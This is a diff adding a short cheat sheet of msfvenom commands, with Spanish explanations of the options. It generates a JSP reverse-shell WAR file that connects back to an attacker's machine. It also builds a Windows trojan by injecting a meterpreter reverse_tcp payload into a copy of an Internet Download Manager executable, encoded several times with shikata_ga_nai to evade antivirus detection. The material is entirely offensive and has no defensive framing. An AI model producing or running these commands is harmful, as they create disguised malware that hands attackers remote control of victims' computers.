@@ -1,0 +1,14 @@
+
+::: msfvenom -l payloads
+
+::: msfvenom -l payloads | grep -E "java"
+
+::: msfvenom -p java/jsp_shell_reverse_tcp LHOST=ipKali LPORT=443  -f war  -o shell.war
+
+
+                LHOST=...........             ip al que conectara el archivo
+                LPORT=....                    puerto de escucha
+                -f tipoArchivoHere            define el tipo de archivo
+                -o nameFileHere               define el nombre del archivo
+
+msfvenom -a x86 --platform windows -x $HOME/Downloads/idm.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.0.16 lport=888 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o mango.exe
